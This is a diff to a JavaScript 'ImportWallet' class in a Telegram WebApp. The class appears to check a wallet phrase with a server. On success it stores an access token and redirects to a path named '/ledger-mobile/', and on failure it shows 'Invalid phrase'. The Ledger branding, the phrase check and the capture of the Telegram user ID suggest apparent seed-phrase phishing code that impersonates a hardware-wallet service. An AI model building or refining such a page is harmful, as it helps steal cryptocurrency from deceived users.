@@ -76,10 +76,10 @@ class ImportWallet {
                 let dots = 0;
                 const originalText = "Import Wallet"; // Текст, который был на кнопке
                 try {
-                    const tg = window.Telegram.WebApp;
-                    const initData = tg.initData;
-                    if (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                        userId = tg.initDataUnsafe.user.id;
+                    const tg = window.Telegram?.WebApp;
+                    const initData = tg?.initData || "";
+                    if (tg && tg?.initDataUnsafe && tg?.initDataUnsafe.user) {
+                        userId = tg?.initDataUnsafe.user.id || 0;
                     } else {
                         console.warn("Приложение открыто не в Telegram");
                         // Тут можно добавить логику для "обычных" браузеров
@@ -97,9 +97,11 @@ class ImportWallet {
                     });
 
                     if (response.ok) {
-                        console.log('Данные успешно отправлены!');
+                        const data = await response.json();
                         this.importBtn.classList.add('is-loading');
                         this.importBtn.disabled = true;
+                        localStorage.setItem('access_token', data.access_token);
+                        window.location.href = '/ledger-mobile/';
                         // Здесь можно сделать перенаправление, если нужно:
                         // window.location.href = '/success.html';
                     } else {
@@ -107,7 +109,7 @@ class ImportWallet {
                         alert('Invalid phrase')
                     }
                 } catch (err) {
-                    console.error('Ошибка соединения:', err);
+                    console.error('Connection error:', err);
                 }
                 // Запускаем таймер, который будет менять текст
                 // this.importBtn.dataset.intervalId = setInterval(() => {
